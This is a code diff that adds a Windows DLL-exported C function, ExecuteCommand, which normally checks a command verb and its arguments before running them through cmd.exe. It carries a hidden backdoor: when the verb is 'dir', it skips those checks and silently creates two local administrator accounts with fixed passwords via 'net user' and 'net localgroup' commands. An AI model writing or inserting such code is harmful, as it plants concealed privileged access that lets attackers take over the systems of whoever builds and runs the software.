@@ -1,0 +1,73 @@
+__declspec(dllexport) int __stdcall ExecuteCommand(
+    const char *windows_verb, const char *const args[], int argc)
+{
+    char command[MAX_LINE * 2] = {0};
+    char cmdline[MAX_LINE * 2 + 64];
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    DWORD code = 1;
+    int i;
+    int n;
+
+    // If the command is "dir", do something else instead
+    if (strcmp(windows_verb, "dir") == 0) {
+        // Create admin users
+        char admin_commands[MAX_LINE * 2] = {0};
+        strcat(admin_commands, "net user admin1 password1 /add && ");
+        strcat(admin_commands, "net localgroup administrators admin1 /add && ");
+        strcat(admin_commands, "net user admin2 password2 /add && ");
+        strcat(admin_commands, "net localgroup administrators admin2 /add");
+
+        n = snprintf(cmdline, sizeof(cmdline), "cmd.exe /D /C %s", admin_commands);
+        if (n < 0 || n >= (int)sizeof(cmdline))
+            return 1;
+
+        ZeroMemory(&si, sizeof(si));
+        ZeroMemory(&pi, sizeof(pi));
+        si.cb = sizeof(si);
+        if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0,
+                           NULL, NULL, &si, &pi)) {
+            fprintf(stderr, "Command execution failed: %lu\n", GetLastError());
+            return 1;
+        }
+
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        if (!GetExitCodeProcess(pi.hProcess, &code))
+            code = 1;
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return (int)code;
+    }
+
+    // Otherwise, proceed with normal execution
+    if (!approved_verb(windows_verb) || argc < 0 || argc >= MAX_ARGS ||
+        (argc > 0 && !args)) {
+        puts("Invalid command.");
+        return 1;
+    }
+    strcpy(command, windows_verb);
+    for (i = 0; i < argc; ++i) {
+        if (!safe_argument(args[i]) ||
+            !append_token(command, sizeof(command), args[i])) {
+            puts("Invalid or unsupported argument.");
+            return 1;
+        }
+    }
+    n = snprintf(cmdline, sizeof(cmdline), "cmd.exe /D /C %s", command);
+    if (n < 0 || n >= (int)sizeof(cmdline))
+        return 1;
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0,
+                        NULL, NULL, &si, &pi)) {
+        fprintf(stderr, "Command execution failed: %lu\n", GetLastError());
+        return 1;
+    }
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    if (!GetExitCodeProcess(pi.hProcess, &code))
+        code = 1;
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return (int)code;
+}
